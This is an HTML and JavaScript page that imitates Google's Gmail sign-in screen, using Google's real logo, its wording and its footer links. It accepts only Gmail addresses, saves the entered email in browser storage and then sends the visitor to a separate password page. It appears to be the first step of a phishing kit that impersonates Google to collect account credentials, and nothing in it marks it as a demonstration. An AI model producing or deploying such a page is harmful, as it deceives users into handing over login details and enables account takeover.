<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#F8F9FA] flex justify-center items-center min-h-screen">

    <!-- Centering the form container -->
    <div class="w-full max-w-md bg-white rounded-lg shadow-xl p-8">
        <!-- Google logo -->
        <div class="flex justify-center mb-6">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" class="h-12">
        </div>

        <h1 class="text-2xl font-semibold text-gray-900 mb-4">Sign in</h1>
        <p class="text-sm text-gray-600 mb-6">to continue to Gmail</p>

        <!-- Email Form -->
        <form id="email-form">
            <div class="mb-4">
                <label class="sr-only" for="email">Email or phone</label>
                <input class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg" id="email" name="email" placeholder="Email or phone" type="text" required>
                <p id="error-message" class="hidden text-red-600 text-sm mt-2">Enter a valid Gmail address</p>
            </div>

            <div class="flex justify-between items-center mb-6">
                <a class="text-blue-600 text-sm" href="#">Forgot email?</a>
            </div>

            <p class="text-sm text-gray-600 mb-6">
                Not your computer? Use Guest mode to sign in privately.
                <a class="text-blue-600" href="#">Learn more about using Guest mode</a>
            </p>

            <div class="flex justify-between items-center">
                <a class="text-blue-600 text-sm" href="#">Create account</a>
                <button class="bg-blue-600 text-white px-6 py-2 rounded-md text-lg" type="submit" id="next-btn" disabled>Next</button>
            </div>
        </form>
    </div>

    <footer class="w-full bg-[#F8F9FA] py-4 mt-6">
        <div class="flex justify-between items-center text-gray-600 text-sm px-6">
            <div>
                <select class="bg-transparent text-sm text-gray-600">
                    <option>English (United States)</option>
                </select>
            </div>
            <div class="flex space-x-4">
                <a class="hover:underline" href="#">Help</a>
                <a class="hover:underline" href="#">Privacy</a>
                <a class="hover:underline" href="#">Terms</a>
            </div>
        </div>
    </footer>

    <script>
        // Handle the email form submission
        document.getElementById('email-form').addEventListener('submit', function (event) {
            event.preventDefault();  // Prevent the default form submission behavior

            const email = document.getElementById('email').value.trim();

            // Validate the email format
            if (validateEmail(email)) {
                localStorage.setItem('email', email); // Store email in localStorage
                window.location.href = 'password.html'; // Redirect to the password page
            }
        });

        // Validate the email format (only Gmail addresses)
        function validateEmail(email) {
            const regex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
            return regex.test(email);  // Return true if valid Gmail, else false
        }

        // Enable Next button when email is valid
        document.getElementById('email').addEventListener('input', function () {
            const email = document.getElementById('email').value.trim();
            const errorMessage = document.getElementById('error-message');
            const emailField = document.getElementById('email');

            if (validateEmail(email)) {
                document.getElementById('next-btn').disabled = false;
                emailField.classList.remove('border-red-500');
                emailField.classList.add('border-gray-300');
                errorMessage.classList.add('hidden');
            } else {
                document.getElementById('next-btn').disabled = true;
                emailField.classList.add('border-red-500');
                errorMessage.classList.remove('hidden');
            }
        });
    </script>

</body>
</html>
